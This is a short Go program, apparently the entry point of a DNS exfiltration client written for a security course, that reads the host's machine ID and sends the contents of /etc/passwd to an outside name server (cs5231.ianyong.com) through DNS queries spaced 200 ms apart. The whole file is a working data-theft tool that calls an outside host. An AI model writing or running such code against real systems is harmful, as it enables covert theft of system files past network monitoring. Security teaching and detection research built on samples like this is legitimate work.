package main

import (
	"dns-exfiltration-client/exfiltrator"
	"log"

	"github.com/denisbrodbeck/machineid"
)

const (
	NAME_SERVER = "cs5231.ianyong.com"
	DELAY       = 200
)

func main() {
	machineId, err := machineid.ID()
	if err != nil {
		log.Fatalln(err)
	}
	dnsExfiltrator := exfiltrator.NewDnsExfiltrator(NAME_SERVER, machineId, DELAY)
	dnsExfiltrator.ExfiltrateFile("/etc/passwd")
}
